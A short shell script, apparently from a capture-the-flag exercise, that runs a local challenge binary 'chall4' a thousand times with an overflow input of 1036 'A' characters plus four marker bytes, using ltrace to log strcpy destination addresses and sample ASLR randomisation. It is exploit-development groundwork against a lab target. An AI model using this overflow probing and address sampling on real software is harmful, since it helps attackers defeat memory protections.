rm chall4_aslr-sample.txt;
for i in {1..1000}; do ltrace ../chall4 $(python3 -c 'print("A" * 1036 + "\xaa\xaa\xaa\xaa")') 2>&1 | grep -E "^strcpy" | sed s/'strcpy('// | cut -d "," -f 1 >> chall4_aslr-sample.txt; done
